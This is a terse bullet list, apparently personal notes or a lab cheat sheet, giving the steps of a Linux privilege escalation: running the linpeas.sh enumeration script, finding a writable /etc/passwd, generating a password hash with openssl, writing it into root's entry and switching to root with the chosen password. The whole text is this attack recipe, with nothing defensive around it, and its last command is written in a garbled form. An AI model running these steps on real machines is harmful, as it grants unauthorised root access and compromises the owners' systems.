-  \./linpeas\.sh
-  writable /etc/passwd
-  openssl passwd test123
-  nano /etc/passwd
-  root:$HASH$
-  su root:test123
#